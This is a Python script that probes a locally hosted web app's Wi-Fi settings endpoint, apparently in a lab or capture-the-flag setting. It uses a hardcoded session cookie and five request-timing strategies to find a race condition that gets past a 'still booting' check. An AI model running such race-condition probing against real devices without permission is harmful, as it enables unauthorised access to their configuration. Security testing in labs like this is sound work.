import requests
import time
import statistics

# Target configuration
base_url = "http://127.0.0.1:32992"
cookies = {"session": "ahYINfgSeZIuIVlIHpUK5jZSk4ahE5y7ZFvZds3KuA8"}

session = requests.Session()

print("[=] ALTERNATIVE RACE STRATEGIES")
print("="*60)

# Strategy 1: Rapid GET-then-POST patterns
print("\n[+] Strategy 1: GET-then-POST burst patterns")
for burst_id in range(10):
    results = []
    
    # Rapid pattern: GET, then POST immediately
    for i in range(5):
        get_resp = session.get(f"{base_url}/wifi_settings", cookies=cookies, timeout=10)
        post_resp = session.post(f"{base_url}/wifi_settings", 
                                cookies=cookies, 
                                data={"ssid": "Test", "password": "test"},
                                timeout=10)
        has_booting = "still booting" in post_resp.text.lower()
        results.append(has_booting)
    
    success_rate = results.count(False) / len(results) * 100
    print(f"  Burst {burst_id+1}: {success_rate:.0f}% non-booting ({results.count(False)}/5)")
    
    if results.count(False) > 0:
        print(f"    [!] Found non-booting response!")
        # Re-run to capture details
        for i in range(10):
            get_resp = session.get(f"{base_url}/wifi_settings", cookies=cookies, timeout=10)
            post_resp = session.post(f"{base_url}/wifi_settings", 
                                    cookies=cookies, 
                                    data={"ssid": "Test", "password": "test"},
                                    timeout=10)
            if "still booting" not in post_resp.text.lower():
                print(f"      Response {i}: {post_resp.text[:500]}")
                break
    
    time.sleep(0.05)

# Strategy 2: Check if session cookie affects state
print("\n[+] Strategy 2: Session cookie analysis")
# Get new cookies
for i in range(5):
    # Clear and re-establish session
    test_session = requests.Session()
    # First visit dashboard to establish session
    dash_resp = test_session.get(f"{base_url}/dashboard", timeout=10)
    if 'session' in test_session.cookies:
        new_cookies = dict(test_session.cookies)
        print(f"  Visit {i+1}: Got session cookie: {new_cookies.get('session', 'N/A')[:20]}...")
        
        # Test with fresh session
        post_resp = test_session.post(f"{base_url}/wifi_settings", 
                                     data={"ssid": "Test", "password": "test"},
                                     timeout=10)
        has_booting = "still booting" in post_resp.text.lower()
        print(f"            Booting check: {has_booting}")
    else:
        print(f"  Visit {i+1}: No session cookie")

# Strategy 3: Check response for timing clues
print("\n[+] Strategy 3: Timing pattern analysis")
times_with_booting = []
times_check = []

for i in range(50):
    start = time.perf_counter()
    post_resp = session.post(f"{base_url}/wifi_settings", 
                            cookies=cookies, 
                            data={"ssid": "Test", "password": "test"},
                            timeout=10)
    elapsed = (time.perf_counter() - start) * 1000
    has_booting = "still booting" in post_resp.text.lower()
    
    if has_booting:
        times_with_booting.append(elapsed)

if times_with_booting:
    print(f"  Booting error response times:")
    print(f"    Min: {min(times_with_booting):.2f}ms")
    print(f"    Max: {max(times_with_booting):.2f}ms")
    print(f"    Mean: {sum(times_with_booting)/len(times_with_booting):.2f}ms")
    print(f"    Variance: {statistics.variance(times_with_booting) if len(times_with_booting) > 1 else 0:.4f}")

# Strategy 4: Check if form submission order matters
print("\n[+] Strategy 4: Form field order and extra parameters")
field_tests = [
    {"ssid": "test", "password": "test123"},
    {"password": "test123", "ssid": "test"},
    {"ssid": "test", "password": "test123", "security": "WPA"},
    {"ssid": "test", "password": "test123", "extra": "value"},
    {"ssid": "test"},  # Missing password
    {"password": "test123"},  # Missing ssid
]

for i, data in enumerate(field_tests):
    post_resp = session.post(f"{base_url}/wifi_settings", 
                            cookies=cookies, 
                            data=data,
                            timeout=10)
    has_booting = "still booting" in post_resp.text.lower()
    print(f"  Test {i+1}: Fields={list(data.keys())}, Booting={has_booting}")

# Strategy 5: Raw socket-like timing
print("\n[+] Strategy 5: Ultra-rapid single request timing")
for interval in [1, 5, 10, 20, 50]:  # milliseconds between requests
    successes = 0
    for i in range(20):
        post_resp = session.post(f"{base_url}/wifi_settings", 
                                cookies=cookies, 
                                data={"ssid": "Test", "password": "test"},
                                timeout=10)
        if "still booting" not in post_resp.text.lower():
            successes += 1
        time.sleep(interval / 1000)
    
    print(f"  Interval {interval}ms: {successes}/20 non-booting")

